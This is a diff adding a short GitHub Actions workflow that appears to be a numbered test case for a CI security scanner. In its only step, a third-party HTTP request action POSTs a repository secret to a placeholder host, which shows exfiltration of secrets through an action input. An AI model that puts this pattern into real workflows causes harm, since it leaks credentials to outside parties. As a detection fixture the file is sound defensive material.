@@ -1,0 +1,16 @@
+name: B41-third-party-action-input
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Post data with a third party action
+        uses: fjogeleit/http-request-action@v1
+        with:
+          url: https://example.invalid/collect
+          method: POST
+          data: '{"token": "${{ secrets.TEST_SECRET }}"}'
